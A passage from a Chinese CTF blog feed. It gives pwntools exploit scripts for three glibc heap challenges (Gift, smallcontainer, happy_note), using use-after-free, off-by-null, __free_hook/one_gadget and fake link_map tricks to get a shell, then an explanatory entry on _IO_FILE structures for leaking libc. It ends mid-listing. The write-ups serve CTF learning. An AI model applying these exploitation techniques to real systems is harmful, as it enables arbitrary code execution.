0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;新版glibc的改进&quot;&gt;&lt;a href=&quot;#新版glibc的改进&quot; class=&quot;headerlink&quot; title=&quot;新版glibc的改进&quot;&gt;&lt;/a&gt;新版glibc的改进&lt;/h1&gt;&lt;p&gt;从glibc 2.28开始，增加了对unsorted bin的bk检验，使得</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>巅峰极客复现</title>
    <link href="http://wscyoulin.github.io/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/"/>
    <id>http://wscyoulin.github.io/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/</id>
    <published>2022-08-20T16:18:17.000Z</published>
    <updated>2022-10-02T06:24:20.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h1><p>存在uaf，但是只能申请10次堆块，每次只能申请0x60或者0x100大小的堆块，往里写的内容是往user_data+0x10处写（比赛时好像没有给libc，看网上的wp确定的是2.27）</p><p>exp：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">io = process('./pwn')</span><br><span class="line">libc = ELF('/home/youlin/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b"your choice:")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(what,content):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b"your choice:")</span><br><span class="line">    io.sendline(str(what))</span><br><span class="line">    io.recvuntil(b"plz write your wish on your gift!")</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b"index?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b"index?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def bargain(idx,offset):</span><br><span class="line">    menu(5)</span><br><span class="line">    io.recvuntil(b"index?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"How much?")</span><br><span class="line">    io.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">add(1,b'a'*0xc0+p64(0)+p64(0x451))#0 为后面构造fakechunk做准备</span><br><span class="line">add(1,b'a'*8)#1</span><br><span class="line">add(1,b'a'*8)#2</span><br><span class="line">add(1,b'a'*8)#3</span><br><span class="line">add(1,b'a'*0xd0+p64(0)+p64(0x21))#4 同上</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">bargain(2,-0xe0)#修改fd指针为+0xe0</span><br><span class="line"></span><br><span class="line">add(1,b'a'*8)#5 </span><br><span class="line">add(1,b'a'*8)#6</span><br><span class="line">delete(6)</span><br><span class="line">show(6)</span><br><span class="line">io.recvuntil(b'cost: ')</span><br><span class="line">#-0x1ecba0</span><br><span class="line">base = int(io.recvuntil(b'\n')[:-1],10)-96-0x10-libc.sym['__malloc_hook']</span><br><span class="line">free_hook=base+libc.sym['__free_hook']</span><br><span class="line">one_gadget=base+0x4f322</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line">add(2,p64(free_hook-0x10)*8)#7</span><br><span class="line">#add(1,b'/bin/sh\x00')#8</span><br><span class="line">add(1,b'aaaa')</span><br><span class="line">add(1,p64(one_gadget))#9</span><br><span class="line">delete(3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h1><p>存在一个off by null</p><p>exp：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">io = process('./smallcontainer')</span><br><span class="line">libc = ELF('./libc-2.27.so')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b"&gt; ")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b"Input size: ")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b"Input index: ")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b"Input index: ")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b"Input index: ")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x1f8)#0</span><br><span class="line">add(0x110)#1</span><br><span class="line">add(0x110)#2</span><br><span class="line">for i in range(8):#3-10</span><br><span class="line">    add(0x1f8)</span><br><span class="line"></span><br><span class="line">for j in range(3,10):</span><br><span class="line">    delete(j)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(0x208)#0</span><br><span class="line">add(0x208)#3</span><br><span class="line">add(0x218)#4</span><br><span class="line"></span><br><span class="line">edit(10,b'a'*0x1f8)#这里是off by null讲堆块0的inuse位改为0</span><br><span class="line">edit(10,b'a'*0x1f0+p64(0x1440))#这里才是修改prevsize造成向后合并</span><br><span class="line">edit(0,b'a'*0x1f0+p64(0)+p64(0x221))#恢复堆块结构</span><br><span class="line">delete(0)#将堆块都合并成了一个unsorted bin</span><br><span class="line">for k in range(7):#5-9,11,12</span><br><span class="line">    add(0x1f8)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x1f8)#2</span><br><span class="line">show(1)</span><br><span class="line">libc_base = int(io.recv(12),16)-96-0x10-libc.sym['__malloc_hook']</span><br><span class="line">free_hook = libc_base+libc.symbols["__free_hook"]</span><br><span class="line"></span><br><span class="line">add(0x1f8)#12</span><br><span class="line">edit(12,b'a'*0x110+p64(0)+p64(0x121)+p64(free_hook))</span><br><span class="line">add(0x110)#13</span><br><span class="line">add(0x110)#14</span><br><span class="line">one_gadget = libc_base+0x4f302</span><br><span class="line">edit(14,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">log.success("libc_base: "+hex(libc_base))</span><br><span class="line"># gdb.attach(r)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h1><p>exp:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">io = process('./happy_note')</span><br><span class="line">#libc = ELF('/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">libc=ELF("./libc.so.6")</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b"&gt;&gt; ")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b"Note size:")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Choose a mode: [1] or [2]")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Edit your content:")</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b"Which one do you want to show?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym['setcontext'] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym['system']</span><br><span class="line">sh = libcbase + libc.search(b'/bin/sh').__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b'content: ')</span><br><span class="line">key = u64(io.recvuntil(b'\n')[:-1].ljust(8,b'\0'))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b'a' * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b'\x00' * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, b'\x00')</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b'\x00')</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b'\x00' * (0x12c - 0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Gift&quot;&gt;&lt;a href=&quot;#Gift&quot; class=&quot;headerlink&quot; title=&quot;Gift&quot;&gt;&lt;/a&gt;Gift&lt;/h1&gt;&lt;p&gt;存在uaf，但是只能申请10次堆块，每次只能申请0x60或者0x100大小的堆块，往里写的内容是往user_data+0x1</summary>
      
    
    
    
    <category term="cometition" scheme="http://wscyoulin.github.io/categories/cometition/"/>
    
    
  </entry>
  
  <entry>
    <title>利用_IO_2_1_stdout泄露libc</title>
    <link href="http://wscyoulin.github.io/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/"/>
    <id>http://wscyoulin.github.io/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/</id>
    <published>2022-08-06T12:47:44.000Z</published>
    <updated>2022-08-07T08:19:01.284Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FILE结构-libc2-23"><a href="#FILE结构-libc2-23" class="headerlink" title="FILE结构(libc2.23)"></a>FILE结构(libc2.23)</h2><p>FILE在linux系统的标准IO库使用来描述文件结构，称之为文件流。这里提及的”流“其实是一种抽象的概念，无论是硬件还是软件其实都没有”流“一说，只是人们为了便于描述数据的流向而创造的名称。比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流“FILE结构在程序执行fopen函数时会自动进行创建，并分配在堆中。我们常定义一个纸箱FILE结构的指针来接收这个返回值</p><p>FILE结构定义在<code>glibc/libio/libio.h</code>中，结构源码如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE {</span><br><span class="line">  int _flags;/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;/* End of get area. */</span><br><span class="line">  char* _IO_read_base;/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p><p><img src="https://s2.loli.net/2022/08/06/s2uvBVPLgDSjyk4.png" alt="图片.png"></p><p>在标准I/O库中，每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code></p><h2 id="IO-FILE-plus结构"><a href="#IO-FILE-plus结构" class="headerlink" title="_IO_FILE_plus结构"></a>_IO_FILE_plus结构</h2><p>事实上_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针vtable（虚表）指向了一系列函数指针：</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。位置为glibc/libio/libioP.h</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">{</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>这里说明一下vtable(虚表)是个什么东西，我们在学C语言的时候会学到一个叫做虚函数的东西，具有虚函数的类都会有一张vtable(虚表)，其中记录了本类中所有虚函数的函数指针，也就是说是个函数指针数组的起始位置，通常虚表在编程中所具有的作用是为了标识父类。需要注意的是虚表中值班韩虚函数的指针，没有函数体，虚函数表既有继承性又有多态性<br>vtable 是IO_jump_t 类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针。也就是说，如果使用_IO_FILE_plus去定义一个结构体指针的话，我们既可以使用IO_FILE中的结构体成员变量，也能使用IO_jump_t中的函数指针</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] = {</span><br><span class="line">   1 NULL, // "extra word"</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   </span><br><span class="line">   8 NULL, // xsputn  #printf后面讲解执行流程章节会用到此处</span><br><span class="line">   9 NULL, // xsgetn</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>_flags规则</p><p>那么通过上述对IO_FILE和_IO_FILE_plus结构的了解，这里我们将深入的讲解一下IO_FILE结构体中的第一个成员变量_flag，这个成员变量在利用_IO_2_1_stdout泄露libc的时候具有至关重要的作用。</p><p>先简单介绍一下_flag的规则，_flag的高两位字节是由libc固定的，不同的libc可能存在差异，但是基本上都一样：0xfbad0000。高两位字节其实就是作为一个标识，标志这是一个什么文件。而低两位字节的位数规则决定了程序的执行状态，低两位的规则如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></tbody></table></figure><p>一般在执行流程中会将<code>_flag</code>和定义常量进行<code>按位与</code>运算，并根据与运算的结构进行判断如何执行。后面_IO_2_1_stdout泄露libc章节，我们会一起走一遍输出函数执行流程，在其中就会<code>运用到此处的内容</code></p><h2 id="puts-函数执行流程"><a href="#puts-函数执行流程" class="headerlink" title="puts()函数执行流程"></a>puts()函数执行流程</h2><p>类似的输出函数比如fwrite函数等执行流程都差不多，区别在于由libc库中运行各个输出函数的.c文件不一样，但是流程都相似，并且都会殊途同归进行输出系统调用</p><h3 id="IO-puts-–-gt-IO-new-file-xsputn"><a href="#IO-puts-–-gt-IO-new-file-xsputn" class="headerlink" title="_IO_puts –> _IO_new_file_xsputn"></a>_IO_puts –&gt; _IO_new_file_xsputn</h3><p>puts()函数在源码中的表现形式为_IO_puts，我们一起来看一下源码位置在：<code>glibc/libio/ioputs.c</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">{</span><br><span class="line">  int result = 